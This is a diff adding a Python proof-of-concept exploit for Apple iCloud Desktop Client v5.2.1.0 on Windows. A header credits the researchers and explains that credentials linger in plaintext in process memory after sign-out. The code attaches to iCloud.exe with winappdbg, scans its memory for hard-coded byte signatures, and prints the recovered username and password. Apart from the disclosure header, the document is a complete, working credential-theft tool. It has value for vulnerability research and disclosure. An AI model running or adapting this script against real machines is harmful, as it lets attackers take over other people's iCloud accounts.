@@ -1,0 +1,99 @@
+#####
+# Apple iCloud Desktop Client v5.2.1.0 Local Credentials Disclosure After Sign Out Exploit
+# Tested on Windows Windows 7 64bit, English
+# Vendor Homepage 	@ https://www.apple.com/
+# Product Homepage 	@ https://support.apple.com/en-us/HT204283
+# Date 07/09/2016
+# Bug Discovery by:
+#
+# Yakir Wizman (https://www.linkedin.com/in/yakirwizman)
+# http://www.black-rose.ml
+#
+# Viktor Minin (https://www.linkedin.com/in/MininViktor)
+# https://1-33-7.com/
+#
+# Alexander Korznikov (https://www.linkedin.com/in/nopernik)
+# http://korznikov.com/
+#
+#####
+# Apple iCloud Desktop Client v5.2.1.0 is vulnerable to local credentials disclosure after the user is logged out.
+# It seems that iCloud does not store the supplied credentials while the user is logged in, but after sign out the supplied username and password are stored in a plaintext format in memory process.
+# Funny eh?!
+# A potential attacker could reveal the supplied username and password in order to gain access to iCloud account.
+#
+# Authors are not responsible for any misuse or demage which caused by use of this script code.
+# Please use responsibly.
+#####
+# Proof-Of-Concept Code:
+
+import time
+import urllib
+from winappdbg import Debug, Process
+
+def b2h(str):
+    return ''.join(["%02X " % ord(x) for x in str]).strip()
+
+def h2b(str):
+	bytes = []
+	str = ''.join(str.split(" "))
+	for i in range(0, len(str), 2):
+		bytes.append(chr(int(str[i:i+2], 16)))
+	return ''.join(bytes)
+
+usr			= ''
+pwd			= ''
+found		= 0
+filename 	= "iCloud.exe"
+process_pid = 0
+memory_dump	= []
+
+debug = Debug()
+try:
+	print "#########################################################################"
+	print "#\tApple iCloud v5.2.1.0 Local Credentials Disclosure Exploit\t#"
+	print "#   Bug Discovery by Yakir Wizman, Victor Minin, Alexander Korznikov\t#"
+	print "#\t\tTested on Windows Windows 7 64bit, English\t\t#"
+	print "#\t\t\tPlease use responsibly.\t\t\t\t#"
+	print "#########################################################################\r\n"
+	print "[~] Searching for pid by process name '%s'.." % (filename)
+	time.sleep(1)
+	debug.system.scan_processes()
+	for (process, process_name) in debug.system.find_processes_by_filename(filename):
+		process_pid = process.get_pid()
+	if process_pid is not 0:
+		print "[+] Found process with pid #%d" % (process_pid)
+		time.sleep(1)
+		print "[~] Trying to read memory for pid #%d" % (process_pid)
+		
+		process = Process(process_pid)
+		for address in process.search_bytes('\x88\x38\xB7\xAE\x73\x8C\x07\x00\x0A\x16'):
+			memory_dump.append(process.read(address,50))
+		
+		try:
+			str = b2h(memory_dump[0]).split('88 38 B7 AE 73 8C 07 00 0A 16')[1]
+			usr = h2b(str.split(' 00')[0])
+		except:
+			pass
+			
+		memory_dump	= []
+		for address in process.search_bytes('\x65\x00\x88\x38\xB7\xAE\x73\x8C\x07\x00\x02\x09'):
+			memory_dump.append(process.read(address,60))
+		try:
+			str = b2h(memory_dump[0]).split('07 00 02 09')[1]
+			pwd = h2b(str.split(' 00')[0])
+		except:
+			pass
+		
+		if usr != '' and pwd !='':
+			found = 1
+			print "[+] iCloud Credentials found!\r\n----------------------------------------"
+			print "[+] Username: %s" % usr
+			print "[+] Password: %s" % pwd
+		if found == 0:
+			print "[-] Credentials not found!"
+	else:
+		print "[-] No process found with name '%s'." % (filename)
+	
+	debug.loop()
+finally:
+    debug.stop()
